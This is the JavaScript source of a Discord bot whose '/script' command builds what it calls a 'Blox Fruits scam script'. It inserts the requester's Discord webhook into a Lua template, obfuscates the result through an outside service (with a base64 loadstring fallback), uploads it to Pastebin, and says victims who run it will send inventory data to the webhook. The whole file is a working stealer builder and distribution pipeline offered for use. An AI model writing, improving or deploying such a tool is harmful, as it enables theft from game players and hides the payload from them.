const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const express = require('express');
require('dotenv').config();

// ----- Web server for health checks (Koyeb requires it) -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// Goofyscator API (free, no key)
const OBFUSCATE_URL = 'https://goofyscator.lua.cz/api/obfuscate';

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // 1. Read and inject placeholders
        let template = fs.readFileSync('./template.lua', 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // 2. Obfuscate via Goofyscator (max security)
        let obfuscatedScript;
        try {
            const form = new FormData();
            form.append('code', template);
            form.append('level', 'max');  // VM + anti‑tamper

            const response = await axios.post(OBFUSCATE_URL, form, {
                headers: form.getHeaders(),
                timeout: 30000
            });
            if (response.data && response.data.obfuscated) {
                obfuscatedScript = response.data.obfuscated;
            } else {
                throw new Error('Goofyscator returned unexpected response');
            }
        } catch (obfError) {
            console.error('Obfuscation error:', obfError.message);
            // Fallback: Base64 obfuscation
            const encoded = Buffer.from(template, 'utf8').toString('base64');
            obfuscatedScript = `-- Fallback obfuscation\nloadstring(game:HttpGet("data:text/plain;base64," .. "${encoded}"))()`;
        }

        // 3. Upload to Pastebin
        const pasteUrl = await uploadToPastebin(obfuscatedScript, username);

        // 4. Reply with embed
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated (Goofyscated)')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { name: '📦 Download Link', value: pasteUrl },
                { name: '🔒 Obfuscation', value: 'Goofyscator (max level – VM + anti‑tamper)' },
                { name: '📌 Instructions', value: 'Run this script in a Blox Fruits executor. The loading screen will appear, and your webhook will receive inventory data.' }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Pastebin Upload (free, requires API key) -----
async function uploadToPastebin(content, username) {
    const apiKey = process.env.PASTEBIN_API_KEY;
    if (!apiKey) {
        throw new Error('PASTEBIN_API_KEY not set. Please add it to .env');
    }

    const pasteData = new URLSearchParams({
        api_dev_key: apiKey,
        api_option: 'paste',
        api_paste_code: content,
        api_paste_name: `Exodus_${username}_${Date.now()}.lua`,
        api_paste_format: 'lua',
        api_paste_private: 1,          // unlisted
        api_paste_expire_date: '1D'    // expires in 1 day
    });

    const response = await axios.post('https://pastebin.com/api/api_post.php', pasteData);
    const pasteUrl = response.data;

    if (!pasteUrl.startsWith('https://pastebin.com/')) {
        throw new Error('Pastebin upload failed: ' + pasteUrl);
    }
    return pasteUrl;
}

client.login(process.env.DISCORD_TOKEN);
